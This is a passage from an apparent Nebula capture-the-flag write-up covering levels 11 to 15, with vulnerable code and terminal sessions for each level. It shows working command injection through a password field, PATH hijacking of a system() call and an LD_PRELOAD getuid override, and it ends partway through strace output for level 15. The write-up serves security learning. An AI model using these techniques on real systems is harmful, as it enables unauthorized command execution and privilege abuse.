      <span style="color: #f8f8f2">fd</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">getrand(</span><span style="color: #f92672">&amp;</span><span style="color: #f8f8f2">path);</span>

      <span style="color: #66d9ef">while</span><span style="color: #f8f8f2">(blue</span> <span style="color: #f92672">&gt;</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
          <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;blue = %d, length = %d, &quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">blue,</span> <span style="color: #f8f8f2">length);</span>

          <span style="color: #f8f8f2">pink</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">fread(buf,</span> <span style="color: #ae81ff">1</span><span style="color: #f8f8f2">,</span> <span style="color: #66d9ef">sizeof</span><span style="color: #f8f8f2">(buf),</span> <span style="color: #f8f8f2">stdin);</span>
          <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;pink = %d</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">pink);</span>

          <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(pink</span> <span style="color: #f92672">&lt;=</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
              <span style="color: #f8f8f2">err(</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot;fread fail(blue = %d, length = %d)&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">blue,</span> <span style="color: #f8f8f2">length);</span>
          <span style="color: #f8f8f2">}</span>
          <span style="color: #f8f8f2">write(fd,</span> <span style="color: #f8f8f2">buf,</span> <span style="color: #f8f8f2">pink);</span>

          <span style="color: #f8f8f2">blue</span> <span style="color: #f92672">-=</span> <span style="color: #f8f8f2">pink;</span>
      <span style="color: #f8f8f2">}</span>    

      <span style="color: #f8f8f2">mem</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">mmap(NULL,</span> <span style="color: #f8f8f2">length,</span> <span style="color: #f8f8f2">PROT_READ</span><span style="color: #f92672">|</span><span style="color: #f8f8f2">PROT_WRITE,</span> <span style="color: #f8f8f2">MAP_PRIVATE,</span> <span style="color: #f8f8f2">fd,</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">);</span>
      <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(mem</span> <span style="color: #f92672">==</span> <span style="color: #f8f8f2">MAP_FAILED)</span> <span style="color: #f8f8f2">{</span>
          <span style="color: #f8f8f2">err(</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot;mmap&quot;</span><span style="color: #f8f8f2">);</span>
      <span style="color: #f8f8f2">}</span>
      <span style="color: #f8f8f2">process(mem,</span> <span style="color: #f8f8f2">length);</span>
  <span style="color: #f8f8f2">}</span>

<span style="color: #f8f8f2">}</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>The code reads data from stdin. In order to get code execution (reach the <em>process</em> function) we need to satisfy a few input conditions. The first line should contain a valid header, which is
&ldquo;Content-Length: &ldquo; followed by the length value. Then, depending on the length value, one of two execution paths are taken. If length is &lt;1024 the first path is taken.
This piece of code reads into a buffer:</p>

<pre><code>      if(fread(buf, length, 1, stdin) != length) {
          err(1, &quot;fread length&quot;);
      }
</code></pre>

<p>The <em>fread()</em> function will always return 1 here, because by definition it returns number of <em>items</em> read and not bytes read. So it looks like if we want to take the first execution path - our
workable buffer length is 1.</p>

<p>If we test the program with a valid header and a buffer which only contains the <strong>&lsquo;x&rsquo;</strong>:


<figure class="code">
  <figcaption>
  	<span>Command Execution</span>
  </figcaption>
  <div class="codewrapper">
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">1
2
3
4
5</pre></div></td><td class="code"><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level11@nebula:~$ /home/flag11/flag11 
Content-Length: 1
x
sh: yP?: <span style="color: #f8f8f2">command</span> not found
level11@nebula:~$ 
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>We can see that we reach the <em>system()</em> call and taht the <em>&lsquo;x&rsquo;</em> char was decoded to <em>&lsquo;y&rsquo;</em>. The additional random chars are due to inability to properly null terminate our buffer, but
executing the same buffer a few times we can reach a point where the second char will randomly be a null terminator.
So now we can get code execution:</p>

<p>

<figure class="code">
  <figcaption>
  	<span>Flag11</span>
  </figcaption>
  <div class="codewrapper">
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13</pre></div></td><td class="code"><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level11@nebula:~$ cat y
getflag

level11@nebula:~$ <span style="color: #f8f8f2">export</span> <span style="color: #f8f8f2">PATH</span><span style="color: #f92672">=</span>~:$PATH
level11@nebula:~$ <span style="color: #f8f8f2">echo</span> -ne <span style="color: #e6db74">&quot;Content-Length: 1\nx&quot;</span> <span style="color: #f8f8f2">|</span> /home/flag11/flag11 
sh: yp!: <span style="color: #f8f8f2">command</span> not found
level11@nebula:~$ <span style="color: #f8f8f2">echo</span> -ne <span style="color: #e6db74">&quot;Content-Length: 1\nx&quot;</span> <span style="color: #f8f8f2">|</span> /home/flag11/flag11 
sh: <span style="color: #e6db74">$&#39;y0\314&#39;</span>: <span style="color: #f8f8f2">command</span> not found
level11@nebula:~$ <span style="color: #f8f8f2">echo</span> -ne <span style="color: #e6db74">&quot;Content-Length: 1\nx&quot;</span> <span style="color: #f8f8f2">|</span> /home/flag11/flag11 
sh: <span style="color: #e6db74">$&#39;y\260\356&#39;</span>: <span style="color: #f8f8f2">command</span> not found
level11@nebula:~$ <span style="color: #f8f8f2">echo</span> -ne <span style="color: #e6db74">&quot;Content-Length: 1\nx&quot;</span> <span style="color: #f8f8f2">|</span> /home/flag11/flag11 
getflag is executing on a non-flag account, this doesn<span style="color: #960050; background-color: #1e0010">&#39;</span>t count
level11@nebula:~$ 
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>We manage to execute <em>getflag</em>, but it complains about the user id. There are no user id manipulations in the code prior to calling <em>system()</em>, so I think there is a bug in this level.</p>

<h3 id="level12:2941ec772c52d0561257d6ef26aa317a">Level12</h3>

<h4 id="decription:2941ec772c52d0561257d6ef26aa317a">Decription:</h4>

<blockquote>
<p><em>There is a backdoor process listening on port 50001.</em></p>
</blockquote>

<p>

<figure class="code">
  <figcaption>
  	<span>Source Code</span>
  </figcaption>
  <div class="codewrapper">
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33</pre></div></td><td class="code"><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #66d9ef">local</span> <span style="color: #f8f8f2">socket</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">require(</span><span style="color: #e6db74">&quot;socket&quot;</span><span style="color: #f8f8f2">)</span>
<span style="color: #66d9ef">local</span> <span style="color: #f8f8f2">server</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">assert(socket.bind(</span><span style="color: #e6db74">&quot;127.0.0.1&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #ae81ff">50001</span><span style="color: #f8f8f2">))</span>

<span style="color: #66d9ef">function</span> <span style="color: #a6e22e">hash</span><span style="color: #f8f8f2">(password)</span>
  <span style="color: #f8f8f2">prog</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">io.popen(</span><span style="color: #e6db74">&quot;echo &quot;</span><span style="color: #f92672">..</span><span style="color: #f8f8f2">password</span><span style="color: #f92672">..</span><span style="color: #e6db74">&quot; | sha1sum&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot;r&quot;</span><span style="color: #f8f8f2">)</span>
  <span style="color: #f8f8f2">data</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">prog:read(</span><span style="color: #e6db74">&quot;*all&quot;</span><span style="color: #f8f8f2">)</span>
  <span style="color: #f8f8f2">prog:close()</span>

  <span style="color: #f8f8f2">data</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">string.sub(data,</span> <span style="color: #ae81ff">1</span><span style="color: #f8f8f2">,</span> <span style="color: #ae81ff">40</span><span style="color: #f8f8f2">)</span>

  <span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">data</span>
<span style="color: #66d9ef">end</span>


<span style="color: #66d9ef">while</span> <span style="color: #ae81ff">1</span> <span style="color: #66d9ef">do</span>
  <span style="color: #66d9ef">local</span> <span style="color: #f8f8f2">client</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">server:accept()</span>
  <span style="color: #f8f8f2">client:send(</span><span style="color: #e6db74">&quot;Password: &quot;</span><span style="color: #f8f8f2">)</span>
  <span style="color: #f8f8f2">client:settimeout(</span><span style="color: #ae81ff">60</span><span style="color: #f8f8f2">)</span>
  <span style="color: #66d9ef">local</span> <span style="color: #f8f8f2">line,</span> <span style="color: #f8f8f2">err</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">client:receive()</span>
  <span style="color: #66d9ef">if</span> <span style="color: #f92672">not</span> <span style="color: #f8f8f2">err</span> <span style="color: #66d9ef">then</span>
      <span style="color: #f8f8f2">print(</span><span style="color: #e6db74">&quot;trying &quot;</span> <span style="color: #f92672">..</span> <span style="color: #f8f8f2">line)</span> <span style="color: #75715e">-- log from where ;\</span>
      <span style="color: #66d9ef">local</span> <span style="color: #f8f8f2">h</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">hash(line)</span>

      <span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">h</span> <span style="color: #f92672">~=</span> <span style="color: #e6db74">&quot;4754a4f4bd5787accd33de887b9250a0691dd198&quot;</span> <span style="color: #66d9ef">then</span>
          <span style="color: #f8f8f2">client:send(</span><span style="color: #e6db74">&quot;Better luck next time</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">);</span>
      <span style="color: #66d9ef">else</span>
          <span style="color: #f8f8f2">client:send(</span><span style="color: #e6db74">&quot;Congrats, your token is 413**CARRIER LOST**</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">)</span>
      <span style="color: #66d9ef">end</span>

  <span style="color: #66d9ef">end</span>

  <span style="color: #f8f8f2">client:close()</span>
<span style="color: #66d9ef">end</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>The listener expects a password which is hashed (SHA1) and compared to a hardcoded value. The way the hash is calculated is vulnerable
to command injection:</p>

<p>

<figure class="code">
  <figcaption>
  	<span>Flag12</span>
  </figcaption>
  <div class="codewrapper">
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">1
2
3
4
5
6
7
8
9</pre></div></td><td class="code"><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level12@nebula:/home/flag12$ nc localhost 50001
Password: <span style="color: #f8f8f2">test</span>
Better luck next <span style="color: #f8f8f2">time</span>
level12@nebula:/home/flag12$ nc localhost 50001
Password: test<span style="color: #f8f8f2">;</span> getflag &gt; /tmp/flag.txt<span style="color: #f8f8f2">;</span> <span style="color: #f8f8f2">test</span>
Better luck next <span style="color: #f8f8f2">time</span>
level12@nebula:/home/flag12$ cat /tmp/flag.txt 
You have successfully executed getflag on a target account
level12@nebula:/home/flag12$ 
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<h3 id="level13:2941ec772c52d0561257d6ef26aa317a">Level13</h3>

<h4 id="description-1:2941ec772c52d0561257d6ef26aa317a">Description:</h4>

<blockquote>
<p><em>There is a security check that prevents the program from continuing execution if the user invoking it does not match a specific user id.</em></p>
</blockquote>

<p>

<figure class="code">
  <figcaption>
  	<span>Source Code</span>
  </figcaption>
  <div class="codewrapper">
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24</pre></div></td><td class="code"><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">#include</span> <span style="color: #75715e">&lt;stdlib.h&gt;</span>
<span style="color: #75715e">#include</span> <span style="color: #75715e">&lt;unistd.h&gt;</span>
<span style="color: #75715e">#include</span> <span style="color: #75715e">&lt;stdio.h&gt;</span>
<span style="color: #75715e">#include</span> <span style="color: #75715e">&lt;sys/types.h&gt;</span>
<span style="color: #75715e">#include</span> <span style="color: #75715e">&lt;string.h&gt;</span>

<span style="color: #75715e">#define FAKEUID 1000</span>

<span style="color: #66d9ef">int</span> <span style="color: #a6e22e">main</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">argc,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">argv,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">envp)</span>
<span style="color: #f8f8f2">{</span>
  <span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">c;</span>
  <span style="color: #66d9ef">char</span> <span style="color: #f8f8f2">token[</span><span style="color: #ae81ff">256</span><span style="color: #f8f8f2">];</span>

  <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(getuid()</span> <span style="color: #f92672">!=</span> <span style="color: #f8f8f2">FAKEUID)</span> <span style="color: #f8f8f2">{</span>
      <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;Security failure detected. UID %d started us, we expect %d</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">getuid(),</span> <span style="color: #f8f8f2">FAKEUID);</span>
      <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;The system administrators will be notified of this violation</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">);</span>
      <span style="color: #f8f8f2">exit(EXIT_FAILURE);</span>
  <span style="color: #f8f8f2">}</span>

  <span style="color: #75715e">// snip, sorry :)</span>

  <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;your token is %s</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">token);</span>
  
<span style="color: #f8f8f2">}</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>For this level we can override getuid() function using the <em>LD_PRELOAD</em> <a href="(https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/)">trick</a>. The original binary is setuid which discards the LD_PRELOAD variable. So this technique does not work for privilege escalation and instead can be used to divert execution path without modifying the binary itself.
For this we need to copy the executable somewhere else:</p>

<p>

<figure class="code">
  <figcaption>
  	<span>Flag13</span>
  </figcaption>
  <div class="codewrapper">
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19</pre></div></td><td class="code"><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level13@nebula:~$ cat uid.c
<span style="color: #75715e">#include &lt;unistd.h&gt;</span>
uid_t getuid<span style="color: #f92672">()</span>
<span style="color: #f92672">{</span>
     <span style="color: #66d9ef">return</span> 1000<span style="color: #f8f8f2">;</span>
<span style="color: #f92672">}</span>
level13@nebula:~$ gcc -fPIC uid.c -shared -o uid.so
level13@nebula:~$ <span style="color: #f8f8f2">LD_PRELOAD</span><span style="color: #f92672">=</span>~/uid.so /home/flag13/flag13 
Security failure detected. UID <span style="color: #ae81ff">1014</span> started us, we expect 1000
The system administrators will be notified of this violation
level13@nebula:~$ cp /home/flag13/flag13 /tmp/flag13
level13@nebula:~$ <span style="color: #f8f8f2">LD_PRELOAD</span><span style="color: #f92672">=</span>/home/level13/uid.so /tmp/flag13 
your token is b705702b-76a8-42b0-8844-3adabbe5ac58
level13@nebula:~$ su flag13 -
Password: 
sh-4.2$ id
<span style="color: #f8f8f2">uid</span><span style="color: #f92672">=</span>986<span style="color: #f92672">(</span>flag13<span style="color: #f92672">)</span> <span style="color: #f8f8f2">gid</span><span style="color: #f92672">=</span>986<span style="color: #f92672">(</span>flag13<span style="color: #f92672">)</span> <span style="color: #f8f8f2">groups</span><span style="color: #f92672">=</span>986<span style="color: #f92672">(</span>flag13<span style="color: #f92672">)</span>
sh-4.2$ getflag
You have successfully executed getflag on a target account
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<h3 id="level14:2941ec772c52d0561257d6ef26aa317a">Level14</h3>

<h4 id="description-2:2941ec772c52d0561257d6ef26aa317a">Description:</h4>

<blockquote>
<p><em>This program resides in /home/flag14/flag14. It encrypts input and writes it to standard output. An encrypted token file is also in that home directory, decrypt it :)</em></p>
</blockquote>

<p>No source code was provided for this level. So here we must analyze the binary itself and deduce how it encrypts the provided input.
By passing several test strings we can test how the binary works:</p>

<p>

<figure class="code">
  <figcaption>
  	<span>Encryption</span>
  </figcaption>
  <div class="codewrapper">
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">1
2</pre></div></td><td class="code"><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level14@nebula:/home/flag14$ <span style="color: #f8f8f2">echo</span> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA <span style="color: #f8f8f2">|</span> ./flag14 -e
ABCDEFGHIJKLMNOPQRSTUVWXYZ<span style="color: #f92672">[</span><span style="color: #ae81ff">\]</span>^_<span style="color: #e6db74">`</span>abcdefg1level14@nebula:/home/flag14$ 
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>Here we can see that each character in the string is shifted according to its possition (index).
A quick python script should reverse this process and decrypt the token:</p>

<p>

<figure class="code">
  <figcaption>
  	<span>Flag14</span>
  </figcaption>
  <div class="codewrapper">
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19</pre></div></td><td class="code"><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level14@nebula:/home/flag14$ cat token 
857:g67?5ABBo:BtDA?tIvLDKL<span style="color: #f92672">{</span>MQPSRQWW.
level14@nebula:/home/flag14$ cat /tmp/decrypt.py 
import sys

<span style="color: #f8f8f2">encrypted</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">&#39;857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW.&#39;</span>
<span style="color: #f8f8f2">plaintext</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">&#39;&#39;</span>
<span style="color: #66d9ef">for</span> i in xrange<span style="color: #f92672">(</span>len<span style="color: #f92672">(</span>encrypted<span style="color: #f92672">))</span>:
    <span style="color: #f8f8f2">char</span> <span style="color: #f92672">=</span> chr<span style="color: #f92672">(</span>ord<span style="color: #f92672">(</span>encrypted<span style="color: #f92672">[</span>i<span style="color: #f92672">])</span> - i<span style="color: #f92672">)</span>
    plaintext +<span style="color: #f92672">=</span> char

print plaintext
level14@nebula:/home/flag14$ python /tmp/decrypt.py 
8457c118-887c-4e40-a5a6-33a25353165

level14@nebula:/home/flag14$ su flag14 -
Password: 
sh-4.2$ getflag 
You have successfully executed getflag on a target account
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<h3 id="level15:2941ec772c52d0561257d6ef26aa317a">Level15</h3>

<h4 id="description-3:2941ec772c52d0561257d6ef26aa317a">Description:</h4>

<blockquote>
<p><em>Strace the binary at /home/flag15/flag15 and see if you spot anything out of the ordinary.</em>
<em>You may wish to review how to “compile a shared library in linux” and how the libraries are loaded and processed by reviewing the dlopen manpage in depth.</em>
<em>Clean up after yourself :)</em></p>
</blockquote>

<p>Stracing the <em>flag15</em> binary shows a bunch of reads of <em>libc.so.6</em> library inside various folders inside <em>/var/tmp/flag15</em>:


<figure class="code">
  <figcaption>
  	<span>Strace</span>
  </figcaption>
  <div class="codewrapper">
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61</pre></div></td><td class="code"><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level15@nebula:~$ strace /home/flag15/flag15 
execve<span style="color: #f92672">(</span><span style="color: #e6db74">&quot;/home/flag15/flag15&quot;</span>, <span style="color: #f92672">[</span><span style="color: #e6db74">&quot;/home/flag15/flag15&quot;</span><span style="color: #f92672">]</span>, <span style="color: #f92672">[</span>/* <span style="color: #ae81ff">18</span> vars */<span style="color: #f92672">])</span> <span style="color: #f92672">=</span> 0
brk<span style="color: #f92672">(</span>0<span style="color: #f92672">)</span>                                  <span style="color: #f92672">=</span> 0x8685000
access<span style="color: #f92672">(</span><span style="color: #e6db74">&quot;/etc/ld.so.nohwcap&quot;</span>, F_OK<span style="color: #f92672">)</span>      <span style="color: #f92672">=</span> -1 ENOENT <span style="color: #f92672">(</span>No such file or directory<span style="color: #f92672">)</span>
mmap2<span style="color: #f92672">(</span>NULL, 8192, PROT_READ<span style="color: #f8f8f2">|</span>PROT_WRITE, MAP_PRIVATE<span style="color: #f8f8f2">|</span>MAP_ANONYMOUS, -1, 0<span style="color: #f92672">)</span> <span style="color: #f92672">=</span> 0xb77a7000
access<span style="color: #f92672">(</span><span style="color: #e6db74">&quot;/etc/ld.so.preload&quot;</span>, R_OK<span style="color: #f92672">)</span>      <span style="color: #f92672">=</span> -1 ENOENT <span style="color: #f92672">(</span>No such file or directory<span style="color: #f92672">)</span>
open<span style="color: #f92672">(</span><span style="color: #e6db74">&quot;/var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6&quot;</span>, O_RDONLY<span style="color: #f92672">)</span> <span style="color: #f92672">=</span> -1 ENOENT <span style="color: #f92672">(</span>No such file or directory<span style="color: #f92672">)</span>
stat64<span style="color: #f92672">(</span><span style="color: #e6db74">&quot;/var/tmp/flag15/tls/i686/sse2/cmov&quot;</span>, 0xbf8c25d4<span style="color: #f92672">)</span> <span style="color: #f92672">=</span> -1 ENOENT <span style="color: #f92672">(</span>No such file or directory<span style="color: #f92672">)</span>
open<span style="color: #f92672">(</span><span style="color: #e6db74">&quot;/var/tmp/flag15/tls/i686/sse2/libc.so.6&quot;</span>, O_RDONLY<span style="color: #f92672">)</span> <span style="color: #f92672">=</span> -1 ENOENT <span style="color: #f92672">(</span>No such file or directory<span style="color: #f92672">)</span>
stat64<span style="color: #f92672">(</span><span style="color: #e6db74">&quot;/var/tmp/flag15/tls/i686/sse2&quot;</span>, 0xbf8c25d4<span style="color: #f92672">)</span> <span style="color: #f92672">=</span> -1 ENOENT <span style="color: #f92672">(</span>No such file or directory<span style="color: #f92672">)</span>
open<span style="color: #f92672">(</span><span style="color: #e6db74">&quot;/var/tmp/flag15/tls/i686/cmov/libc.so.6&quot;</span>, O_RDONLY<span style="color: #f92672">)</span> <span style="color: #f92672">=</span> -1 ENOENT <span style="color: #f92672">(</span>No such file or directory<span style="color: #f92672">)</span>
stat64<span style="color: #f92672">(</span><span style="color: #e6db74">&quot;/var/tmp/flag15/tls/i686/cmov&quot;</span>, 0xbf8c25d4<span style="color: #f92672">)</span> <span style="color: #f92672">=</span> -1 ENOENT <span style="color: #f92672">(</span>No such file or directory<span style="color: #f92672">)</span>
open<span style="color: #f92672">(</span><span style="color: #e6db74">&quot;/var/tmp/flag15/tls/i686/libc.so.6&quot;</span>, O_RDONLY<span style="color: #f92672">)</span> <span style="color: #f92672">=</span> -1 ENOENT <span style="color: #f92672">(</span>No such file or directory<span style="color: #f92672">)</span>
stat64<span style="color: #f92672">(</span><span style="color: #e6db74">&quot;/var/tmp/flag15/tls/i686&quot;</span>, 0xbf8c25d4<span style="color: #f92672">)</span> <span style="color: #f92672">=</span> -1 ENOENT <span style="color: #f92672">(</span>No such file or directory<span style="color: #f92672">)</span>
open<span style="color: #f92672">(</span><span style="color: #e6db74">&quot;/var/tmp/flag15/tls/sse2/cmov/libc.so.6&quot;</span>, O_RDONLY<span style="color: #f92672">)</span> <span style="color: #f92672">=</span> -1 ENOENT <span style="color: #f92672">(</span>No such file or directory<span style="color: #f92672">)</span>
stat64<span style="color: #f92672">(</span><span style="color: #e6db74">&quot;/var/tmp/flag15/tls/sse2/cmov&quot;</span>, 0xbf8c25d4<span style="color: #f92672">)</span> <span style="color: #f92672">=</span> -1 ENOENT <span style="color: #f92672">(</span>No such file or directory<span style="color: #f92672">)</span>
open<span style="color: #f92672">(</span><span style="color: #e6db74">&quot;/var/tmp/flag15/tls/sse2/libc.so.6&quot;</span>, O_RDONLY<span style="color: #f92672">)</span> <span style="color: #f92672">=</span> -1 ENOENT <span style="color: #f92672">(</span>No such file or directory<span style="color: #f92672">)</span>
stat64<span style="color: #f92672">(</span><span style="color: #e6db74">&quot;/var/tmp/flag15/tls/sse2&quot;</span>, 0xbf8c25d4<span style="color: #f92672">)</span> <span style="color: #f92672">=</span> -1 ENOENT <span style="color: #f92672">(</span>No such file or directory<span style="color: #f92672">)</span>
open<span style="color: #f92672">(</span><span style="color: #e6db74">&quot;/var/tmp/flag15/tls/cmov/libc.so.6&quot;</span>, O_RDONLY<span style="color: #f92672">)</span> <span style="color: #f92672">=</span> -1 ENOENT <span style="color: #f92672">(</span>No such file or directory<span style="color: #f92672">)</span>
stat64<span style="color: #f92672">(</span><span style="color: #e6db74">&quot;/var/tmp/flag15/tls/cmov&quot;</span>, 0xbf8c25d4<span style="color: #f92672">)</span> <span style="color: #f92672">=</span> -1 ENOENT <span style="color: #f92672">(</span>No such file or directory<span style="color: #f92672">)</span>
open<span style="color: #f92672">(</span><span style="color: #e6db74">&quot;/var/tmp/flag15/tls/libc.so.6&quot;</span>, O_RDONLY<span style="color: #f92672">)</span> <span style="color: #f92672">=</span> -1 ENOENT <span style="color: #f92672">(</span>No such file or directory<span style="color: #f92672">)</span>
stat64<span style="color: #f92672">(</span><span style="color: #e6db74">&quot;/var/tmp/flag15/tls&quot;</span>, 0xbf8c25d4<span style="color: #f92672">)</span> <span style="color: #f92672">=</span> -1 ENOENT <span style="color: #f92672">(</span>No such file or directory<span style="color: #f92672">)</span>
open<span style="color: #f92672">(</span><span style="color: #e6db74">&quot;/var/tmp/flag15/i686/sse2/cmov/libc.so.6&quot;</span>, O_RDONLY<span style="color: #f92672">)</span> <span style="color: #f92672">=</span> -1 ENOENT <span style="color: #f92672">(</span>No such file or directory<span style="color: #f92672">)</span>
stat64<span style="color: #f92672">(</span><span style="color: #e6db74">&quot;/var/tmp/flag15/i686/sse2/cmov&quot;</span>, 0xbf8c25d4<span style="color: #f92672">)</span> <span style="color: #f92672">=</span> -1 ENOENT <span style="color: #f92672">(</span>No such file or directory<span style="color: #f92672">)</span>
open<span style="color: #f92672">(</span><span style="color: #e6db74">&quot;/var/tmp/flag15/i686/sse2/libc.so.6&quot;</span>, O_RDONLY<span style="color: #f92672">)</span> <span style="color: #f92672">=</span> -1 ENOENT <span style="color: #f92672">(</span>No such file or directory<span style="color: #f92672">)</span>
stat64<span style="color: #f92672">(</span><span style="color: #e6db74">&quot;/var/tmp/flag15/i686/sse2&quot;</span>, 0xbf8c25d4<span style="color: #f92672">)</span> <span style="color: #f92672">=</span> -1 ENOENT <span style="color: #f92672">(</span>No such file or directory<span style="color: #f92672">)</span>
open<span style="color: #f92672">(</span><span style="color: #e6db74">&quot;/var/tmp/flag15/i686/cmov/libc.so.6&quot;</span>, O_RDONLY<span style="color: #f92672">)</span> <span style="color: #f92672">=</span> -1 ENOENT <span style="color: #f92672">(</span>No such file or directory<span style="color: #f92672">)</span>
stat64<span style="color: #f92672">(</span><span style="color: #e6db74">&quot;/var/tmp/flag15/i686/cmov&quot;</span>, 0xbf8c25d4<span style="color: #f92672">)</span> <span style="color: #f92672">=</span> -1 ENOENT <span style="color: #f92672">(</span>No such file or directory<span style="color: #f92672">)</span>
open<span style="color: #f92672">(</span><span style="color: #e6db74">&quot;/var/tmp/flag15/i686/libc.so.6&quot;</span>, O_RDONLY<span style="color: #f92672">)</span> <span style="color: #f92672">=</span> -1 ENOENT <span style="color: #f92672">(</span>No such file or directory<span style="color: #f92672">)</span>
stat64<span style="color: #f92672">(</span><span style="color: #e6db74">&quot;/var/tmp/flag15/i686&quot;</span>, 0xbf8c25d4<span style="color: #f92672">)</span> <span style="color: #f92672">=</span> -1 ENOENT <span style="color: #f92672">(</span>No such file or directory<span style="color: #f92672">)</span>
open<span style="color: #f92672">(</span><span style="color: #e6db74">&quot;/var/tmp/flag15/sse2/cmov/libc.so.6&quot;</span>, O_RDONLY<span style="color: #f92672">)</span> <span style="color: #f92672">=</span> -1 ENOENT <span style="color: #f92672">(</span>No such file or directory<span style="color: #f92672">)</span>
